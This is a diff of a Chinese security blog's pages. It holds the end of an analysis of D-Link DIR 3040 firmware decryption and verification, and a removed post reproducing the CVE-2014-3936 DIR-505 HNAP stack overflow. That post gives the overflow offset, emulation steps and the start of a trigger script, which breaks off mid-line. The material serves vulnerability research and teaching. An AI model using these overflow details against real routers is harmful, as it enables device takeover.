class="line">                sub_400C84((<span class="type">int</span>)(IN_MEM + <span class="number">0x6dc</span>), data1_len, (<span class="type">int</span>)hash_buf);</span><br><span class="line">                <span class="comment">// 比较原始固件从156地址起，64个字节大小，和hash_buf中的值进行比较，也就是和加密固件头中预保存的真实加密固件大小的消息摘要比较</span></span><br><span class="line">                <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(hash_buf, IN_MEM + <span class="number">0x9c</span>, <span class="number">64</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">// AES对加密固件进行解密，并输出到OUT_MEM中</span></span><br><span class="line">                  <span class="comment">// 这个地方也可以看出从加密固件的1756地址起就是真正被加密的固件数据，前面都是一些头部信息</span></span><br><span class="line">                  <span class="comment">// 函数逻辑比较简单，就是AES加解密相关，从保存在固件头IN_MEM + 0xc获取解密密钥</span></span><br><span class="line">                  sub_40107C((<span class="type">int</span>)(IN_MEM + <span class="number">0x6dc</span>), data1_len, aes_key, IN_MEM + <span class="number">0xc</span>, OUT_MEM);</span><br><span class="line">                  <span class="comment">// 计算解密后固件的SHA_512消息摘要</span></span><br><span class="line">                  sub_400C84(OUT_MEM, data2_len, (<span class="type">int</span>)hash_buf);</span><br><span class="line">                  <span class="comment">// 和存储在原始加密固件头，从92地址开始、64字节的SHA512进行比较</span></span><br><span class="line">                  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(hash_buf, IN_MEM + <span class="number">0x5c</span>, <span class="number">64</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="comment">// 获取解密固件+aes_key的SHA512</span></span><br><span class="line">                    sub_400D24(OUT_MEM, data2_len, aes_key, (<span class="type">int</span>)hash_buf);</span><br><span class="line">                    <span class="comment">// 和存储在原始固件头，从28地址开始、64字节的SHA512进行比较</span></span><br><span class="line">                    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(hash_buf, IN_MEM + <span class="number">0x1c</span>, <span class="number">64</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="comment">// 使用当前文件系统内的公钥，通过RSA验证消息摘要和签名是否匹配</span></span><br><span class="line">                      <span class="keyword">if</span> ( sub_400E78((<span class="type">int</span>)(IN_MEM + <span class="number">0x5c</span>), <span class="number">64</span>, (<span class="type">int</span>)(IN_MEM + <span class="number">0x2dc</span>), <span class="number">0x200</span>) == <span class="number">1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( sub_400E78((<span class="type">int</span>)(IN_MEM + <span class="number">0x9c</span>), <span class="number">64</span>, (<span class="type">int</span>)(IN_MEM + <span class="number">0x4dc</span>), <span class="number">0x200</span>) == <span class="number">1</span> )</span><br><span class="line">                          v5 = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                          v5 = <span class="number">-1</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        v5 = <span class="number">-1</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="built_in">puts</span>(<span class="string">&quot;check sha512 vendor failed\r&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;check sha512 before failed %d %d\r\n&quot;</span>, data2_len, data1_len);</span><br><span class="line">                    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i )</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> __int8)hash_buf[i]);</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i )</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, *((<span class="type">unsigned</span> __int8 *)IN_MEM + i + <span class="number">92</span>));</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">puts</span>(<span class="string">&quot;check sha512 post failed\r&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;no image matic found\r&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( MEM )</span><br><span class="line">    munmap(MEM, file_blocks);</span><br><span class="line">  <span class="keyword">if</span> ( OUT_MEM )</span><br><span class="line">    munmap(OUT_MEM, v9);</span><br><span class="line">  <span class="keyword">if</span> ( image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">    close(image_fp);</span><br><span class="line">  <span class="keyword">if</span> ( image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">    close(image_fp);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="概述DIR-3040的固件组成以及解密验证逻辑"><a href="#概述DIR-3040的固件组成以及解密验证逻辑" class="headerlink" title="概述DIR 3040的固件组成以及解密验证逻辑"></a>概述DIR 3040的固件组成以及解密验证逻辑</h3><p>从上面最关键的解密函数逻辑分析中，可以知道如果仅仅是解密相关，实际上只用到了AES解密，而且还是使用的硬编码密钥（通过了一些计算）。只是看上面的解密+验证逻辑分析，对整个流程可能还是会有点混乱，下面就说一下加密固件的文件结构和总结一下上面的解密+验证逻辑。</p>
+<p>先直接给出加密固件文件结构的结论，只展现出重要的Header内容，大小1756字节，其后全部是真正的被加密固件数据。</p>
+<table>
+<thead>
+<tr>
+<th>起始地址</th>
+<th>长度（Bytes）</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0：0x00</td>
+<td>4</td>
+<td>魔数：SHRS</td>
+</tr>
+<tr>
+<td>4：0x4</td>
+<td>4</td>
+<td>解密固件的大小，带填充</td>
+</tr>
+<tr>
+<td>8：0x8</td>
+<td>4</td>
+<td>解密固件的大小，不带填充</td>
+</tr>
+<tr>
+<td>12：0xC</td>
+<td>16</td>
+<td>AES_128_CBC解密密钥</td>
+</tr>
+<tr>
+<td>28：0x1C</td>
+<td>64</td>
+<td>解密后固件+KEY的SHA512消息摘要</td>
+</tr>
+<tr>
+<td>92：0x5C</td>
+<td>64</td>
+<td>解密后固件的SHA512消息摘要</td>
+</tr>
+<tr>
+<td>156：0x9C</td>
+<td>64</td>
+<td>加密固件的SHA512消息摘要</td>
+</tr>
+<tr>
+<td>220：0xDC</td>
+<td>512</td>
+<td>未使用</td>
+</tr>
+<tr>
+<td>732：0x2DC</td>
+<td>512</td>
+<td>解密后固件消息摘要的数字签名</td>
+</tr>
+<tr>
+<td>1244：0x4DC</td>
+<td>512</td>
+<td>加密后固件消息摘要的数字签名</td>
+</tr>
+</tbody></table>
+<p>结合上面的加密固件文件结构，再次概述一下解密逻辑：</p>
+<ol>
+<li><p>判断加密固件是否以Magic Number：SHRS开始。</p>
+</li>
+<li><p>判断（加密固件中存放的，真正被加密的固件数据大小的SHA512消息摘要），和，（去除Header之后，数据的SHA512消息摘要）。</p>
+<p>这一步是通过验证固件的文件大小，判定是否有人篡改过固件，如果被篡改，解密失败。</p>
+</li>
+<li><p>读取保存在Header中的AES解密密钥，对加密固件数据进行解密</p>
+</li>
+<li><p>计算（解密后固件数据的SHA512消息摘要），和（预先保存在Header中的、解密后固件SHA512消息摘要）进行对比</p>
+</li>
+<li><p>计算（解密固件数据+解密密钥的、SHA512消息摘要），和（预先保存在Header中的、解密后固件数据+解密密钥的、SHA512消息摘要）进行对比</p>
+</li>
+<li><p>使用保存在当前文件系统中的RSA公钥，验证解密后固件的消息摘要和其签名是否匹配</p>
+</li>
+<li><p>使用保存在当前文件系统中的RSA公钥，验证加密后固件的消息摘要和其签名是否匹配</p>
+</li>
+</ol>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章主要是以DIR 3040固件为例，说明如何从未加密的老固件中去寻找负责解密的可执行文件，用于解密新版的加密固件。先说明拿到一个固件后如何判断已经被加密，然后说明如何去找到负责解密的可执行文件，再通过qemu仿真去执行解密程序，将固件解密，最后简单说了下固件完整性相关的知识，并重点分析了解密程序的解密+验证逻辑。</p>
+<p>这次对于DIR 3040的漏洞分析和固件解密验证过程分析还是花费了不少的时间。首先是固件的获取，从官网下载到的固件是加密的，然后看到一篇文章简单说了下基于未加密固件版本对加密固件进行解密，也是DIR 3040相关的。但是我在官网上没有找到未加密的固件，全部是被加密的固件。又在信息搜集的过程中，发现了原来在Github上有一个比较通用的、针对D-Link系列的<a target="_blank" rel="noopener" href="https://github.com/0xricksanchez/dlink-decrypt">固件解密脚本</a>。原来，Dlink近两年使用的加密、验证程序imgdecrypt基本上都是一个套路，于是我参考了解密脚本开发者在2020年的分析思路，结合之前看过的关于可信计算相关的一些知识点，简单叙述了固件安全性，然后重点分析了解密验证逻辑如上。</p>
+<p>关于漏洞分析，感兴趣的师傅可以看一下我的这篇<a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/07/23/D-Link%20DIR%203040%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0RCE/">分析文章</a>。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://0x00sec.org/t/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/21943">Breaking the D-Link DIR3060 Firmware Encryption</a></li>
+<li><a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/07/23/D-Link%20DIR%203040%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0RCE/">D-Link DIR 3040从信息泄露到RCE</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/dlink%20dir3040%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -193,7 +403,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-04-12 07:14:42 / Modified: 19:15:27" itemprop="dateCreated datePublished" datetime="2023-04-12T07:14:42+08:00">2023-04-12</time>
+              <time title="Created: 2023-04-12 07:14:42 / Modified: 19:20:27" itemprop="dateCreated datePublished" datetime="2023-04-12T07:14:42+08:00">2023-04-12</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -201,7 +411,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                 </span>
             </span>
 
@@ -1319,136 +1533,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2014-3936%20Dlink%20505%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/12/CVE-2014-3936%20Dlink%20505%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">CVE-2014-3936 Dlink 505缓冲区溢出</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-04-12 06:10:30 / Modified: 18:19:33" itemprop="dateCreated datePublished" datetime="2023-04-12T06:10:30+08:00">2023-04-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="CVE-2014-3936-dir-505-数组越界缓冲区溢出"><a href="#CVE-2014-3936-dir-505-数组越界缓冲区溢出" class="headerlink" title="CVE-2014-3936 dir-505 数组越界缓冲区溢出"></a>CVE-2014-3936 dir-505 数组越界缓冲区溢出</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2014-3936 是发生在 dlink 旗下路由器 dir-505 的缓冲区溢出漏洞，漏洞存在于固件版本 1.07 及以前的 HNAP 处理程序中，漏洞发生在 HNAP 处理请求的时候，将 CONTENT_LENGTH 大小的数据直接复制到了缓冲区中，如果 CONTENT_LENGTH 大小超过了缓冲区大小，就会导致缓冲区溢出，进而实现代码执行。总之，是一个数组越界导致缓冲区溢出的漏洞。</p>
-<p>此次漏洞分析采用的是 dir-505 固件版本 1.07，漏洞下载地址见参考链接。通过分析固件的文件系统，可以知道服务器采用的是 lighttpd 作为后端，lighttpd 也是嵌入式设备经常使用的一个小型 http server。发生漏洞的程序是 .&#x2F;usr&#x2F;bin&#x2F;my_cgi.cgi，使用的是 fastcgi 调用过程，当收到 uri 为 HNAP1 的数据包时，会将数据包通过环境变量和标准输入 STDIN 传给 my_cgi.cgi 进行处理。</p>
-<p>漏洞发生的位置是在 main -&gt; do_hnap 函数中，do_hnap 函数在从环境变量中读取数据的时候，先读取数据包长度 CONTENT_LENGTH，然后根据其大小，通过一个循环，从标准输入中每次读取一个字节放在函数栈上的缓冲区中。如果 CONTENT_LENGTH 过大，就会导致缓冲区溢出，实际上就是数据包的数据够多，就会发生缓冲区溢出。IDA 中反编译的关键流程如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_hnap</span><span class="params">()</span> </span><br><span class="line">&#123;  </span><br><span class="line">  dec_content_length = <span class="number">0</span>;</span><br><span class="line">  content_length = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);	<span class="comment">// 从环境变量获取 CONTENT_LENGTH</span></span><br><span class="line">  <span class="keyword">if</span> ( content_length )</span><br><span class="line">    dec_content_length = strtol(content_length, <span class="number">0</span>, <span class="number">10</span>); <span class="comment">// 将 CONTENT_LENGTH 转化为 10 进制</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( dec_content_length &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    loop_pointer = v12;                         <span class="comment">// 指向 buf 的起始位置</span></span><br><span class="line">    end_of_buf = &amp;v12[dec_content_length];      <span class="comment">// 指向 buf 的结束位置</span></span><br><span class="line">    <span class="built_in">memset</span>(v12, <span class="number">0</span>, <span class="keyword">sizeof</span>(v12));                <span class="comment">// 对 buf 清零</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">stdin</span>-&gt;_fileno )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">stdin</span>-&gt;_IO_write_base;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt;= <span class="built_in">stdin</span>-&gt;_IO_write_end )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = (<span class="type">int</span> (**)(FILE *))&amp;_fgetc_unlocked;<span class="comment">// v8 实际上是一个函数指针</span></span><br><span class="line">LABEL_21:</span><br><span class="line">        v7 = ((<span class="type">int</span> (*)(<span class="type">void</span>))v8)();             <span class="comment">// 调用 fgetc</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = *v6;</span><br><span class="line">      <span class="built_in">stdin</span>-&gt;_IO_write_base = v6 + <span class="number">1</span>;</span><br><span class="line">LABEL_22:</span><br><span class="line">      *loop_pointer++ = v7;                     <span class="comment">// 将 fgetc 读取到的字符写入到 buf</span></span><br><span class="line">      <span class="keyword">if</span> ( loop_pointer == end_of_buf )			<span class="comment">// 结束从 STDIN 中读取</span></span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = &amp;fgetc;</span><br></pre></td></tr></table></figure>
-
-<p>在 do_hnap 函数中，函数执行完毕后的返回地址在初始化堆栈的时候存放在 sp + 0x7574，缓冲区的起始地址是 sp + 0x30，那么一共需要 30020 个字节使缓冲区溢出，再额外溢出 4 个字节就可以修改保存再堆上的返回地址，最后 do_hnap 函数执行完毕将返回地址从栈中取出到 ra 寄存器然后跳转，就可以达到劫持控制流的目的。缓冲区的起始地址可以从 IDA 直接反编译得到。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00430DBC sw      $ra, 0x7560+var_s14($sp)	# 保存返回地址到栈上</span><br><span class="line">...</span><br><span class="line">.text:00431168 lw      $ra, 0x7574($sp)	# 从栈上恢复返回地址跳转执行</span><br><span class="line">...</span><br><span class="line">.text:00431184 jr      $ra</span><br><span class="line">.text:00431188 addiu   $sp, 0x7578</span><br></pre></td></tr></table></figure>
-
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>后端的 server 是 lighttpd，一开始没有在固件根目录下面找到 html 文件，在 cq 师傅的提醒下，先分析系统的启动脚本 .&#x2F;etc&#x2F;rc.d&#x2F;rcS。在启动脚本中，挂载一些设备和创建相关目录，然后是系统初始化程序 system_manager 运行，在其中也会通过 system 函数执行一些命令。如下是系统初始化脚本。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/ash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This script runs when init it run during the boot process.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mounts everything <span class="keyword">in</span> the fstab</span></span><br><span class="line">mount -a</span><br><span class="line">mount -o remount +w /</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mount the RAM filesystem to /tmp</span></span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此处会覆盖掉原来的 etc 目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">copy all files <span class="keyword">in</span> the mnt folder to the etc folder</span></span><br><span class="line">cp -a /mnt/* /etc</span><br><span class="line"></span><br><span class="line">ln -sf /etc/hotplug/hotplug /sbin/hotplug</span><br><span class="line"></span><br><span class="line">mkdir -p /var/etc</span><br><span class="line">mkdir -p /var/firm</span><br><span class="line">mkdir -p /var/log</span><br><span class="line">mkdir -p /var/misc</span><br><span class="line">mkdir -p /var/run</span><br><span class="line">mkdir -p /var/sbin</span><br><span class="line">mkdir -p /var/tmp</span><br><span class="line">mkdir -p /tmp/var</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">系统初始化程序</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/echo <span class="string">&quot;Init System...&quot;</span></span></span><br><span class="line">system_manager &amp;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/echo <span class="string">&quot;Start tftpd...&quot;</span></span></span><br><span class="line">tftpd &amp;</span><br></pre></td></tr></table></figure>
-
-<p>将系统初始化程序 system_manager 放入 IDA 分析，在 main -&gt; init_system -&gt; init_web_server -&gt; init_html_files 中可以看到是如何将原本存放在 mnt 目录下的 html 文件解压出来的，那我们在启动 lighttpd 之前就可以手动执行相关的命令，将 html 文件准备好。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init_html_files</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;tar -zxf /etc/www.tgz&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -f /etc/www.tgz&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !byte_416321 )</span><br><span class="line">    system(<span class="string">&quot;mv /www/ap/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/ap&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( byte_416321 == <span class="number">2</span> )</span><br><span class="line">    system(<span class="string">&quot;mv /www/rt/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/rt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( byte_416321 == <span class="number">3</span> )</span><br><span class="line">    system(<span class="string">&quot;mv /www/rpt/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/rpt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( byte_416321 == <span class="number">4</span> )</span><br><span class="line">    system(<span class="string">&quot;mv /www/whp/* /www&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;rm -rf /www/whp&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp -f /usr/bin/my_cgi.cgi /www&quot;</span>);</span><br><span class="line">  copy_default_xml();</span><br><span class="line">  <span class="keyword">return</span> read_lang_from_flash();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后是看 system_manager 是如何启动 lighttpd 的，可以在 IDA 中直接搜索字符串 lighttpd，定位到 init_web_server 函数中，然后分析 system 函数传入的参数，就可以得到 lighttpd 的启动命令 <code>lighttpd -f /etc/lighttpd/lighttpd.conf </code>。此处如果直接 F5 的话，分析得到的 system 传入命令不完整。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00403</span>C00 addiu   $a0, (aLighttpdFS - <span class="number">0x400000</span>)  # <span class="string">&quot;lighttpd -f %s &amp;&quot;</span></span><br><span class="line">.text:<span class="number">00403</span>C04 addiu   $a1, (aEtcLighttpdLig_0 - <span class="number">0x400000</span>)  # <span class="string">&quot;/etc/lighttpd/lighttpd.conf&quot;</span></span><br><span class="line">.text:<span class="number">00403</span>C08 jr      $t9 ; _system</span><br><span class="line">.text:<span class="number">00403</span>C0C addiu   $sp, <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
-
-<p>以上是分析工作，实际上真正启动服务器，可以先直接执行启动脚本 .&#x2F;etc&#x2F;rc.d&#x2F;rcS，执行完之后，.&#x2F;etc 目录被原本 .&#x2F;mnt 中的文件替代了，html 文件被解压出来放在了 .&#x2F;www 文件夹中。运行如下命令，就可以启动 http 服务了。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入固件根目录</span></span><br><span class="line">chroot . ./etc/rc.d/rcS</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再执行一遍 system_manager 这个地方会卡住 因为有些 /dev 没有被挂载，例如 nvram</span></span><br><span class="line">chroot . ./usr/bin/system_manager</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 lighttpd，-D 不进入后台运行</span></span><br><span class="line">chroot . ./usr/bin/lighttpd -f ./etc/lighttpd/lighttpd.conf -D</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-181348580.png" alt="undifined"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上述的环境搭建其实是不完善的，例如登录操作这种需要 nvram 的根本执行不了，好在这次漏洞是一个无需认证的漏洞。我没有找到在 lighttpd 中是怎么调用的 my_cgi.cgi，那就直接调试 cgi，通过环境变量传入数据进行调试。</p>
-<p>幸运的是，可以直接使用 QEMU 进行调试这个漏洞，漏洞的触发过程也不涉及到额外的 patch 工作。首先分析如何才能使代码执行到 do_hnap 函数中存在漏洞的代码处。在 main 函数中，需要设置环境变量 SCRIPT_NAME &#x3D; HNAP1，使之进入 do_hnap 函数，然后设置环境变量 SOAP_ACTION !&#x3D; (Reboot | SetRouterLanSettings | SetWLanRadioSecurity | SetWLanRadioSettings)，也就是不等于以上四者。最后设置环境变量 CONTENT_LENGTH 控制从标准输入读入到缓冲区的字节数目。</p>
-<p>触发漏洞的调试脚本如下，补充说明一下需要将 qemu-mips-static 程序复制到固件的根目录下，这样 chroot 的时候才可以正确使用 qemu-mips-static 进行调试。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo ./debug_mycgi.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SCRIPT_NAME=<span class="string">&quot;HNAP1&quot;</span></span><br><span class="line"><span class="built_in">export</span> SOAP_ACTION=<span class="string">&quot;soap&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;30028&quot;</span></span><br><span class="line"></span><br><span class="line">STDIN=`python -c <span class="string">&quot;print &#x27;A&#x27;*30020 + 